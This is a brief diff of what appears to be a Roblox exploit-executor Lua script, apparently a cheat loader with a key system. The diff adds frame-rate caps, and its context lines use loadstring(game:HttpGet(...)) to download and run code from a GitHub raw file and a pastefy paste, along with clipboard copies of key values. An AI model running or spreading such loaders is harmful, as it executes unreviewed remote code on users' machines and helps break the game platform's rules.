@@ -1,3 +1,4 @@
+setfpscap(25)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/PabloOlsen/My-Copyright/main/NormalKeylist"))()
 wait(2)
 local api = "https://httpbin.org/get"
@@ -215,3 +216,4 @@ setclipboard(Key12)
 print("Axionix")
 setclipboard(Key13)
 loadstring(game:HttpGet("https://pastefy.app/dwq6zCn1/raw"))()
+setfps(25)
